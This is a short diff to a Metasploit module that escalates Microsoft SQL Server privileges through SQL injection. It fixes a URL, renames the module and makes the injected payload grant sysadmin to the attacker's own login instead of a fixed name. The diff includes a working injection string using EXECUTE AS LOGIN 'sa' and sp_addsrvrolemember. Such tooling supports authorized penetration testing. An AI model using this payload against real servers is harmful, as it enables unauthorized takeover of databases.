@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft SQL Server - SQLi Escalate Execute As',
+      'Name'           => 'Microsoft SQL Server SQLi Escalate Execute AS',
       'Description'    => %q{
         This module can be used escalate privileges if the IMPERSONATION privilege has been
         assigned to the user via error based SQL injection.  In most cases, this results in
@@ -190,10 +190,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(imp_user,db_user)
+  def escalate_privs(db_user)
 
     # Setup Query - Impersonate the first sysadmin user on the list
-    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember 'MyUser1','sysadmin';Revert;--"
+    evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '#{db_user}','sysadmin';Revert;--"
 
     # Execute Query
     mssql_query(evil_sql)
